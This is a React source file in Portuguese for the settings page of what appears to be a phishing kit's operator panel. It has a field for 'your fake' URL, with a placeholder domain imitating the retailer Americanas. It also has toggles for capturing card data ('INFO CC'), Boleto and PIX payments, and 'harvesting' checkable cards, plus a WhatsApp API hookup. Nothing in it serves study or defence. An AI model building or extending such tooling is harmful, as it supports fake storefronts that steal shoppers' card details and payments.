import { useEffect, useState } from 'react';
import { AdminDrawer } from './components/AdminDrawer';
import { AdminHeader } from './components/AdminHeader';
import { getGlobalSettings, setBoletoEnabled, setInfoCCEnabled, subscribeToGlobalSettings } from '../../data/settingsStorage';

function WelcomeSection() {
  return (
    <section className="px-5 pt-20">
      <h1 className="text-base font-medium leading-6 text-white sm:text-[18px] sm:leading-7">
        Olá abobora, você está em / Configurações
      </h1>
      <p className="mt-1 text-[13px] leading-5 text-[#7A7F89]">
        Seu serial vence NUNCA
      </p>
    </section>
  );
}

function ToggleOption({
  active,
  label,
  onClick,
}: {
  active: boolean;
  label: 'Ativado' | 'Desativado';
  onClick: () => void;
}) {
  const isActive = active;
  const activeClass =
    label === 'Ativado'
      ? 'bg-[#008f3c] text-white'
      : 'bg-[#ff0048] text-white';
  const inactiveClass = 'bg-[#111827] text-[#8B92A0]';

  return (
    <button
      className={`rounded px-3 py-1 text-[13px] font-semibold leading-5 ${
        isActive ? activeClass : inactiveClass
      }`}
      onClick={onClick}
      type="button"
    >
      {label}
    </button>
  );
}

function ToggleRow({
  label,
  initialValue,
  onChange,
}: {
  label: string;
  initialValue: boolean;
  onChange?: (enabled: boolean) => void;
}) {
  const [enabled, setEnabled] = useState(initialValue);

  const handleSetEnabled = (value: boolean) => {
    setEnabled(value);
    onChange?.(value);
  };

  return (
    <div className="flex h-11 items-center justify-between gap-4">
      <span className="min-w-0 flex-1 text-[13px] font-medium leading-5 text-[#8B92A0]">
        {label}
      </span>
      <div className="flex shrink-0 items-center gap-2">
        <ToggleOption
          active={enabled}
          label="Ativado"
          onClick={() => handleSetEnabled(true)}
        />
        <ToggleOption
          active={!enabled}
          label="Desativado"
          onClick={() => handleSetEnabled(false)}
        />
      </div>
    </div>
  );
}

function SettingsCard() {
  const [fakeUrl, setFakeUrl] = useState('');
  const [loading, setLoading] = useState(true);

  // Estados locais para sync com Firebase via subscribeToGlobalSettings
  const [infoCCEnabled, setLocalInfoCCEnabled] = useState(true);
  const [boletoEnabled, setLocalBoletoEnabled] = useState(false);

  useEffect(() => {
    const unsubscribeSettings = subscribeToGlobalSettings((settings) => {
      setLocalInfoCCEnabled(settings.infoCCEnabled);
      setLocalBoletoEnabled(settings.boletoEnabled);
      setLoading(false);
    });
    return () => {
      unsubscribeSettings();
    };
  }, []);

  const handleSaveUrl = () => {
    localStorage.setItem('fakeUrl', fakeUrl);
  };

  const handleInfoCCChange = async (enabled: boolean) => {
    await setInfoCCEnabled(enabled);
    // Sync Boleto Bancário with INFO CC - they should both be enabled or disabled together
    await setBoletoEnabled(enabled);
  };

  const handleBoletoChange = async (enabled: boolean) => {
    await setBoletoEnabled(enabled);
  };

  return (
    <section className="mx-4 mt-5 rounded-[8px] border border-white/5 bg-[#1A1F28] p-5 sm:mx-5 sm:p-[20px]">
      <div className="border-b border-white/5 pb-3">
        <h2 className="text-base font-medium leading-6 text-[#BFC5D0]">
          Configurações
        </h2>
      </div>

      <div className="divide-y divide-white/5">
        <div className="border border-white/5 bg-[#12161E] p-4">
          <label
            className="text-[13px] font-medium leading-5 text-[#8B92A0]"
            htmlFor="fake-url"
          >
            URL DA SUA FAKE
          </label>
          <div className="mt-2 flex flex-col gap-2 sm:flex-row">
            <input
              className="min-w-0 flex-1 rounded border border-white/5 bg-[#1A1F28] px-3 py-2 text-[13px] leading-5 text-white outline-none placeholder:text-[#5E6573] focus:border-white/20"
              id="fake-url"
              onChange={(event) => setFakeUrl(event.target.value)}
              placeholder="https://descontos.americanas-loja.com"
              type="url"
              value={fakeUrl}
            />
            <button
              className="rounded bg-[#3DD4B9] px-5 py-2 text-sm font-semibold leading-5 text-[#071311] hover:bg-[#31c4aa]"
              onClick={handleSaveUrl}
              type="button"
            >
              Salvar
            </button>
          </div>
        </div>

        <div className="py-4">
          <h3 className="text-sm font-medium leading-5 text-[#BFC5D0]">
            API WHATSAPP
          </h3>
          <p className="mt-1 text-[13px] leading-5 text-[#8B92A0]">
            Instanse Whatsapp
          </p>
          <p className="mt-1 text-[13px] leading-5 text-[#8B92A0]">
            Api Whatsapp
          </p>
          <p className="mt-2 text-[13px] leading-5 text-[#7A7F89]">
            Registre em:{' '}
            <a
              className="text-[13px] leading-5 text-blue-400 hover:text-blue-300"
              href="https://ihat-api.com"
              rel="noreferrer"
              target="_blank"
            >
              https://ihat-api.com
            </a>
          </p>
        </div>

        <ToggleRow initialValue={boletoEnabled} label="Boleto Bancário" onChange={handleBoletoChange} />
        <ToggleRow initialValue={true} label="PIX" />
        <ToggleRow initialValue={infoCCEnabled} label="INFO CC" onChange={handleInfoCCChange} />
        <ToggleRow initialValue={true} label="Colher Consultável" />
      </div>
    </section>
  );
}

function LanguageBar() {
  return (
    <div className="fixed inset-x-0 bottom-0 z-40 border-t border-white/5 bg-[#1A1F28] px-3 py-2">
      <div className="mx-auto flex max-w-sm items-center justify-between gap-2">
        <button className="flex items-center gap-2 text-sm font-medium text-white" type="button">
          <span className="text-base">🌐</span>
          espanhol
        </button>
        <button className="text-sm font-medium text-[#BFC5D0]" type="button">
          português
        </button>
        <button className="text-lg leading-none text-[#BFC5D0]" type="button">
          ⋮
        </button>
        <button className="text-xl leading-none text-[#BFC5D0]" type="button">
          ×
        </button>
      </div>
    </div>
  );
}

function SettingsPage() {
  const [isDrawerOpen, setIsDrawerOpen] = useState(false);

  return (
    <div className="min-h-screen bg-[#12161E] pb-24 text-white">
      <AdminHeader onOpenDrawer={() => setIsDrawerOpen(true)} />
      <AdminDrawer
        activeRoute="/configuracoes"
        isOpen={isDrawerOpen}
        onClose={() => setIsDrawerOpen(false)}
      />
      <WelcomeSection />
      <SettingsCard />
      <LanguageBar />
    </div>
  );
}

export default SettingsPage;
